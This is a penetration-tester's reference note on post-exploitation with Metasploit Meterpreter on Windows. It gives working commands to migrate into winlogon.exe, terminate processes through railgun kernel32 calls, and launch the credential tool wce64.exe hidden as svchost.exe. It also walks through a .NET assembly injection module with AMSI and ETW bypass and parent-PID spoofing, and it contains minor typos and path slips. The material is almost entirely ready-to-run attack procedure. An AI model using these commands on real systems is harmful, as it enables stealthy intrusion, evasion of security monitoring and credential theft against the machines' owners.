---
author(s):
  - Userware
tags:
  - post-exploitation
  - defense-evasion
  - process-injection
  - metasploit-framework
  - windows
---
# Metasploit

## 01 - Migrate Process

### 1.1 - Help Menu

![[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x01 - Defense Evasion/03 - Process Manipulation/Linux/C2 Frameworks/Metasploit#^5d49fa]]

### 1.2 - Usage

```
meterpreter > migrate <pid>

meterpreter > migrate -N <process_name>

meterpreter > migrate -N winlogon.exe
[*] Migrating from 4980 to 412...
[*] Migration completed successfully.
```

## 02 - Terminate Process

### 2.1 - Process ID

Terminate process ID.

![[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x01 - Defense Evasion/03 - Process Manipulation/Linux/C2 Frameworks/Metasploit#^ce813b]]

We'll create a new handle by retrieving the process ID. Then define a process handle `_['return']` after the conditions has been met. Terminate by calling the railgun function with zero exit code as an indication the process has been killed.

```
meterpreter > irb

>> client.railgun.kernel32.OpenProcess("PROCESS_TERMINATE", false, <pid>)

>> process_handle = _['return'] -> define a process handle

>> client.railgun.kernel32.TerminateProcess(process_handle, 0)
```

### 2.2 - Process Name

![[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x01 - Defense Evasion/03 - Process Manipulation/Linux/C2 Frameworks/Metasploit#^365cba]]

## 03 - Inject Process

### 3.1 - Execute Process

Spawn a executable program as a dummy process with `-d` flag.

```
meterpreter > execute -Hicmd svchost.exe -f /usr/share/windows-resources/wce/wce64.exe -a "-h"
```

### 3.2 - DotNET CLR Assembly

```
msf > use post/windows/manage/execute_dotnet_assembly

msf post(windows/manage/execute_dotnet_assembly) > options

Module options (post/windows/manage/execute_dotnet_assembly):

  Name            Current Setting  Required  Description
  ----            ---------------  --------  -----------
  AMSIBYPASS      true             yes       Enable Amsi bypass
  ARGUMENTS                        no        Command line arguments
  DOTNET_EXE                       yes       Assembly file name
  ETWBYPASS       true             yes       Enable Etw bypass
  PID             0                no        Pid  to inject
  PPID            0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)
  PROCESS         notepad.exe      no        Process to spawn
  SESSION                          yes       The session to run this module on
  Signature       Automatic        yes       The Main function signature (Accepted: Automatic, Main(), Main(string[]))
  USETHREADTOKEN  true             no        Spawn process with thread impersonation
  WAIT            10               no        Time in seconds to wait


View the full module info with the info, or info -d command.

msf post(windows/manage/execute_dotnet_assembly) > set dotnet_exe /path/to/compiled_dotnet_tool.exe

msf post(windows/manage/execute_dotnet_assembly) > set arguments [arguments]

msf post(windows/manage/execute_dotnet_assembly) > set signature <Automatic | Main() | Main(string[])>

msf post(windows/manage/execute_dotnet_assembly) > set amsibypass <true | false>

msf post(windows/manage/execute_dotnet_assembly) > set etwbypass <true | false>

msf post(windows/manage/execute_dotnet_assembly) > set process [process_name.exe]

msf post(windows/manage/execute_dotnet_assembly) > set pid [process_ID]

msf post(windows/manage/execute_dotnet_assembly) > set ppid [<parent_process_ID>]

msf post(windows/manage/execute_dotnet_assembly) > set usethreadtoken [true | false]

msf post(windows/manage/execute_dotnet_assembly) > set wait [seconds]

msf post(windows/manage/execute_dotnet_assembly) > set session <session_ID>

msf post(windows/manage/execute_dotnet_assembly) > run
```

`meterpeter` one-liner execution.

```
meterpreter > run post/windows/manage/execute_dotnet_assembly dotnet_exe=/path/to/compiled_dotnet_tool.exe [arguments="<arguments>"] signature=<Automatic | Main() | Main(string[])> set amsibypass=<true | false> etwbypass=<true | false> [process=<process_name>.exe] [pid=<process_ID>] [ppid=<parent_process_ID>] [usethreadtoken=<true | false>] [wait=<seconds>]
```

---
## References

- [Pentestlab Blog: Parent PID Spoofing](https://pentestlab.blog/2020/02/24/parent-pid-spoofing/)